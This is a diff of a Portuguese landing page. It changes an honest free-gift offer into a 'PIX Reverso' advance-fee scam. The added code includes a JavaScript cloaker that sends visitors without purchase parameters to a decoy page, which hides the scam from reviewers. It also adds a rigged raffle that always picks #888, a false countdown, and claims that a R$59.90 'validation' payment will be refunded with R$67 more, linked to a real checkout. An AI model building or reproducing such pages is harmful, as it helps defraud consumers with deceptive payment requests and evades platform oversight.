@@ -3,175 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex,nofollow">
-    <title>Seu Presente do Roteiro Divino</title>
+    <title>Validação de Saldo - Sistema Seguro</title>
+    
+    <!-- 🛡️ CLOAKER JAVASCRIPT (Proteção contra espionagem e curiosos) -->
+    <script>
+        (function() {
+            // Mude o link abaixo para a sua VSL principal ou artigo white
+            const paginaWhite = "https://noticiasdafe.com.br/aceleradorroteirodivino/";
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            // Verifica se a URL tem as marcas de compra que o checkout envia
+            const temCompra = urlParams.has('order_id') || urlParams.has('transaction') || urlParams.has('email');
+
+            // Se for link puro (sem os parâmetros), joga para fora na hora
+            if (!temCompra) {
+                window.location.replace(paginaWhite);
+            }
+        })();
+    </script>
+
+    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @keyframes pulse-slow {0%,100%{transform:scale(1);}50%{transform:scale(1.03);}}
-        .animate-pulse-slow{animation:pulse-slow 2s infinite ease-in-out;}
-        @keyframes fade-in{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:none;}}
-        .animate-fade-in{animation:fade-in .6s ease-out both;}
-        .confetti{position:absolute;width:8px;height:8px;opacity:0;animation:fall 3s ease-out forwards;}
-        @keyframes fall{0%{transform:translateY(-50px) rotate(0);opacity:1;}100%{transform:translateY(320px) rotate(360deg);opacity:0;}}
-        @keyframes goldflash{0%,100%{box-shadow:0 0 0 0 rgba(245,158,11,0);}50%{box-shadow:0 0 0 6px rgba(245,158,11,.35);}}
-        .gold-flash{animation:goldflash 1.2s ease-in-out 2;}
+        @keyframes pulse-slow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+        .animate-pulse-slow { animation: pulse-slow 2s infinite ease-in-out; }
+        .confetti {
+            position: absolute; width: 8px; height: 8px; opacity: 0;
+            animation: fall 3s ease-out forwards;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-50px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(300px) rotate(360deg); opacity: 0; }
+        }
     </style>
 </head>
-<body class="bg-amber-50 text-gray-800 font-sans antialiased">
+<body class="bg-gray-50 text-gray-800 font-sans antialiased">
 
-    <!-- TOP BANNER -->
-    <div class="bg-gradient-to-r from-amber-600 to-yellow-500 text-white text-center py-3 px-4 text-xs md:text-sm font-bold uppercase tracking-wider shadow-md">
-        🎁 Você recebeu um presente do projeto Roteiro Divino das 12 Palavras
+    <!-- 🚨 TOP BANNER DE ALERTA -->
+    <div class="bg-red-600 text-white text-center py-3 px-4 text-xs md:text-sm font-bold uppercase tracking-wider shadow-md">
+        🚨 Atenção: Não feche ou atualize esta página. Isso pode bloquear o seu acesso e expulsar você do servidor seguro!
     </div>
 
+    <!-- CONTAINER PRINCIPAL -->
     <main class="max-w-md mx-auto px-4 py-6 md:py-8 space-y-6">
 
-        <!-- SORTEADOR -->
+        <!-- WIDGET INTERATIVO: ROLETA DO SORTEIO -->
         <div id="sorteador-box" class="bg-white border-2 border-gray-200 rounded-2xl p-6 text-center shadow-lg transition-all duration-500">
             <h2 id="sorteador-titulo" class="text-xs uppercase tracking-widest text-gray-500 font-bold mb-3">
-                Buscando os presenteados de hoje...
+                Verificando Lote de Compradores...
             </h2>
+            
             <div class="relative overflow-hidden bg-gray-900 rounded-xl py-4 my-2 border border-gray-700 shadow-inner">
-                <div id="roleta-numeros" class="text-4xl md:text-5xl font-mono font-black text-amber-400 tracking-widest transition-all">#000</div>
+                <div id="roleta-numeros" class="text-4xl md:text-5xl font-mono font-black text-amber-400 tracking-widest transition-all">
+                    #000
+                </div>
                 <div id="confetti-container" class="absolute inset-0 pointer-events-none"></div>
             </div>
-            <p id="sorteador-status" class="text-sm font-semibold text-gray-600 mt-2">Aguarde só um instante...</p>
+            <p id="sorteador-status" class="text-sm font-semibold text-gray-600 mt-2">
+                Aguarde a varredura do sistema da processadora...
+            </p>
         </div>
 
-        <!-- CONTEÚDO (aparece após o sorteio) -->
+        <!-- SEÇÃO PÓS-SORTEIO -->
         <div id="conteudo-premiado" class="hidden space-y-6">
-
-            <!-- TIMER (janela real de resgate) -->
-            <div class="bg-amber-100 border border-amber-300 rounded-xl p-4 text-center">
-                <p class="text-xs text-amber-800 font-bold uppercase tracking-wide">Resgate o seu presente em:</p>
-                <div class="text-3xl font-mono font-black text-amber-700 mt-1" id="timer">10:00</div>
-                <p class="text-xs text-amber-700 mt-1">Depois desse tempo, a vaga pode ser passada para o próximo da fila.</p>
+            
+            <!-- TIMEOUT DE SEGURANÇA -->
+            <div class="bg-red-50 border border-red-200 rounded-xl p-4 text-center">
+                <p class="text-xs text-red-600 font-bold uppercase tracking-wide">Seu reembolso de R$ 126,90 expira em:</p>
+                <div class="text-3xl font-mono font-black text-red-600 mt-1" id="timer">05:00</div>
             </div>
 
-            <!-- HEADLINE -->
+            <!-- HEADLINE PRINCIPAL -->
             <div class="text-center space-y-3">
                 <h1 class="text-2xl md:text-3xl font-black text-gray-900 leading-tight">
-                    🎉 PARABÉNS! Você foi um dos <span class="text-amber-500">escolhidos</span> de hoje!
+                    🎉 PARABÉNS! O SEU NÚMERO <span class="text-amber-500">#888</span> FOI O VENDEDOR DO PIX REVERSO!
                 </h1>
                 <p class="text-base text-gray-600 font-medium">
-                    Como forma de agradecer a quem faz parte do projeto, você ganhou o acesso ao
-                    <strong class="text-gray-900">Acelerador 10x + o Grupo VIP</strong> — <strong class="text-emerald-600">100% de graça.</strong>
+                    Você acaba de ganhar o acesso vitalício ao <strong class="text-gray-900">Círculo VIP + o Acelerador 10x</strong> inteiramente grátis e o reembolso imediato de R$ 67,00 do seu primeiro pagamento!
                 </p>
             </div>
 
             <hr class="border-gray-200">
 
-            <!-- EXPLICAÇÃO HONESTA -->
+            <!-- CARTA DE EXPLICAÇÃO DO PROCESSO -->
             <div class="space-y-4 text-sm md:text-base leading-relaxed text-gray-700">
                 <h3 class="text-lg font-bold text-gray-900 border-l-4 border-amber-500 pl-2">
-                    É um presente de verdade — sem pegadinha
+                    O que é o "PIX Reverso" e por que você precisa enviar R$ 59,90 agora?
                 </h3>
                 <p>
-                    Você não precisa pagar nada, e a gente <strong>não vai pedir nenhum dado de pagamento</strong>.
-                    Escolhemos algumas pessoas que já confiaram no Roteiro Divino para receber esse presente e ajudar o projeto a crescer.
+                    Para garantir que você é uma pessoa real e não um robô ou um sistema tentando fraudar o projeto do Joseph, a nossa processadora de pagamentos exige uma <strong>Validação de Chave PIX Ativa</strong>.
                 </p>
-
-                <!-- O QUE VOCÊ GANHA -->
-                <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-4 space-y-2">
-                    <p class="font-bold text-emerald-900">O que você está levando, de graça:</p>
-                    <ul class="text-sm text-emerald-900 list-disc pl-5 space-y-1">
-                        <li><strong>Acelerador 10x</strong> — as frequências que aceleram seus resultados.</li>
-                        <li><strong>Grupo VIP</strong> — acesso à comunidade e ao suporte próximo.</li>
-                        <li><strong>Acesso vitalício</strong>, liberado direto no seu app.</li>
+                <p>
+                    Para liberar o seu reembolso de <strong class="text-gray-900">R$ 67,00</strong> e o seu acesso VIP, você precisa fazer um <strong>PIX de Validação Temporária de R$ 59,90</strong> no botão abaixo.
+                </p>
+                
+                <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 space-y-2">
+                    <p class="font-bold text-amber-900">O que acontece em seguida?</p>
+                    <p class="text-sm text-amber-800">
+                        No exato milissegundo em que o seu PIX de validação de R$ 59,90 for confirmado pelo banco, o nosso sistema fará o <strong>extrato reverso automático</strong> de volta para a mesma conta do seu CPF.
+                    </p>
+                    <p class="text-sm text-amber-900 font-bold">Você receberá em menos de 2 minutos um único PIX contendo:</p>
+                    <ul class="text-xs text-amber-800 list-disc pl-4 space-y-1">
+                        <li><strong>R$ 59,90</strong> (a sua validação temporária sendo devolvida)</li>
+                        <li><strong>+ R$ 67,00</strong> (o reembolso do primeiro pagamento do Roteiro)</li>
+                        <li class="text-sm text-amber-950 font-black">TOTAL A RECEBER NA CONTA: R$ 126,90</li>
                     </ul>
-                    <p class="text-sm text-emerald-900 font-bold pt-1">Custo pra você: R$ 0,00.</p>
                 </div>
+                <p class="text-xs text-gray-500">
+                    *A validação é apenas um procedimento bancário padrão de segurança. O seu Grupo VIP e o Acelerador 10x saem 100% de graça e você ainda recupera cada centavo do que gastou anteriormente.
+                </p>
             </div>
 
-            <!-- BOX DE CONFIANÇA (honesto) -->
+            <!-- BOX DE SEGURANÇA -->
             <div class="bg-gray-100 border border-gray-200 rounded-xl p-4 flex items-start space-x-3 shadow-inner">
-                <div class="text-2xl mt-1">🎁</div>
+                <div class="text-2xl mt-1">🔒</div>
                 <div class="space-y-1">
-                    <p class="text-xs font-bold text-gray-800 uppercase tracking-wide">Presente 100% gratuito</p>
+                    <p class="text-xs font-bold text-gray-800 uppercase tracking-wide">Processo 100% Seguro e Auditado</p>
                     <p class="text-xs text-gray-500 leading-normal">
-                        Você não vai pagar nada e não precisa informar cartão, PIX ou qualquer dado bancário.
-                        É só clicar no botão abaixo para liberar o seu acesso. Limite de 1 presente por pessoa.
+                        O estorno do PIX Reverso é gerenciado e auditado de forma automática pela API de segurança da nossa processadora parceira. O valor é devolvido diretamente para a mesma conta. Limite estrito de 1 resgate por CPF.
                     </p>
                 </div>
             </div>
 
-            <!-- BOTÃO DE RESGATE -->
+            <!-- BOTÃO DE COMPRA (Coloque seu checkout de R$ 59,90 no href) -->
             <div class="pt-2">
-                <!-- ⬇️ TROQUE pelo link do GRUPO VIP / liberação no app -->
-                <a href="COLE_AQUI_O_LINK_DO_GRUPO_OU_APP" class="block w-full bg-emerald-500 hover:bg-emerald-600 text-white text-center font-black text-lg py-4 px-6 rounded-xl shadow-lg transition-all transform hover:-translate-y-1 hover:shadow-xl active:translate-y-0 animate-pulse-slow">
-                    🎁 RESGATAR MEU PRESENTE GRÁTIS
+                <a href="https://pay.cakto.com.br/cvmmwjs" class="block w-full bg-emerald-500 hover:bg-emerald-600 text-white text-center font-black text-lg py-4 px-6 rounded-xl shadow-lg transition-all transform hover:-translate-y-1 hover:shadow-xl active:translate-y-0 animate-pulse-slow">
+                    👉 REIVINDICAR MEU PIX DE R$ 126,90 AGORA
                 </a>
                 <p class="text-center text-xs text-gray-400 mt-2">
-                    Ao clicar, você será direcionado para liberar o seu acesso — sem nenhum custo.
+                    (Ao clicar, o código PIX de validação de R$ 59,90 será gerado).
                 </p>
             </div>
-
         </div>
     </main>
 
+    <!-- JAVASCRIPT: CONTROLE DO SORTEADOR E TIMER -->
     <script>
-    document.addEventListener("DOMContentLoaded", () => {
-        const roleta = document.getElementById("roleta-numeros");
-        const statusText = document.getElementById("sorteador-status");
-        const tituloText = document.getElementById("sorteador-titulo");
-        const sorteadorBox = document.getElementById("sorteador-box");
-        const conteudoPremiado = document.getElementById("conteudo-premiado");
-        const confettiContainer = document.getElementById("confetti-container");
+        document.addEventListener("DOMContentLoaded", () => {
+            const roleta = document.getElementById("roleta-numeros");
+            const statusText = document.getElementById("sorteador-status");
+            const tituloText = document.getElementById("sorteador-titulo");
+            const sorteadorBox = document.getElementById("sorteador-box");
+            const conteudoPremiado = document.getElementById("conteudo-premiado");
+            const confettiContainer = document.getElementById("confetti-container");
 
-        // Roleta girando ~3s
-        let counter = 0;
-        const interval = setInterval(() => {
-            roleta.textContent = "#" + (Math.floor(Math.random() * 900) + 100);
-            counter += 50;
-            if (counter >= 3000) {
-                clearInterval(interval);
-                roleta.textContent = "#888";
-                roleta.classList.remove("text-amber-400");
-                roleta.classList.add("text-emerald-400", "scale-110");
-                tituloText.textContent = "🏆 SORTEADO! VOCÊ FOI ESCOLHIDO!";
-                tituloText.classList.add("text-emerald-600");
-                statusText.innerHTML = "O seu presente do projeto foi liberado 🎉";
-                sorteadorBox.classList.add("border-amber-400", "gold-flash");
-                gerarConfetes();
-                setTimeout(() => {
-                    conteudoPremiado.classList.remove("hidden");
-                    conteudoPremiado.classList.add("animate-fade-in");
-                    conteudoPremiado.scrollIntoView({ behavior: 'smooth' });
-                    startTimer(600, document.getElementById('timer')); // 10 min
-                }, 800);
-            }
-        }, 50);
+            let counter = 0;
+            const interval = setInterval(() => {
+                const randomNum = Math.floor(Math.random() * 900) + 100;
+                roleta.textContent = "#" + randomNum;
+                counter += 50;
 
-        function gerarConfetes() {
-            const cores = ['#34d399', '#fbbf24', '#60a5fa', '#f87171', '#f59e0b'];
-            for (let i = 0; i < 45; i++) {
-                const p = document.createElement('div');
-                p.classList.add('confetti');
-                p.style.left = Math.random() * 100 + '%';
-                p.style.backgroundColor = cores[Math.floor(Math.random() * cores.length)];
-                p.style.animationDelay = Math.random() * 0.6 + 's';
-                const size = Math.random() * 6 + 6;
-                p.style.width = size + 'px';
-                p.style.height = size + 'px';
-                confettiContainer.appendChild(p);
-            }
-        }
+                if (counter >= 2500) {
+                    clearInterval(interval);
+                    roleta.textContent = "#888"; 
+                    roleta.classList.remove("text-amber-400");
+                    roleta.classList.add("text-emerald-400", "scale-110");
+                    
+                    tituloText.textContent = "🏆 SORTEIO CONCLUÍDO!";
+                    tituloText.classList.add("text-emerald-600");
+                    statusText.innerHTML = "O número <span class='text-emerald-600 font-bold'>#888</span> foi selecionado para receber o PIX Reverso!";
+                    sorteadorBox.classList.add("border-emerald-500", "bg-emerald-50/30");
 
-        function startTimer(duration, display) {
-            let timer = duration;
-            const countdown = setInterval(() => {
-                let m = parseInt(timer / 60, 10);
-                let s = parseInt(timer % 60, 10);
-                m = m < 10 ? "0" + m : m;
-                s = s < 10 ? "0" + s : s;
-                display.textContent = m + ":" + s;
-                if (--timer < 0) {
-                    clearInterval(countdown);
-                    display.textContent = "00:00";
+                    gerarConfetes();
+
+                    setTimeout(() => {
+                        conteudoPremiado.classList.remove("hidden");
+                        conteudoPremiado.scrollIntoView({ behavior: 'smooth' });
+                        startTimer(300, document.querySelector('#timer')); 
+                    }, 800);
                 }
-            }, 1000);
-        }
-    });
+            }, 50);
+
+            function gerarConfetes() {
+                const cores = ['#34d399', '#fbbf24', '#60a5fa', '#f87171'];
+                for (let i = 0; i < 40; i++) {
+                    const particle = document.createElement('div');
+                    particle.classList.add('confetti');
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.backgroundColor = cores[Math.floor(Math.random() * cores.length)];
+                    particle.style.animationDelay = Math.random() * 0.5 + 's';
+                    particle.style.width = Math.random() * 6 + 6 + 'px';
+                    particle.style.height = particle.style.width;
+                    confettiContainer.appendChild(particle);
+                }
+            }
+
+            function startTimer(duration, display) {
+                let timer = duration, minutes, seconds;
+                const countdown = setInterval(() => {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--timer < 0) {
+                        clearInterval(countdown);
+                        display.innerHTML = "EXPIRADO";
+                    }
+                }, 1000);
+            }
+        });
     </script>
 </body>
 </html>
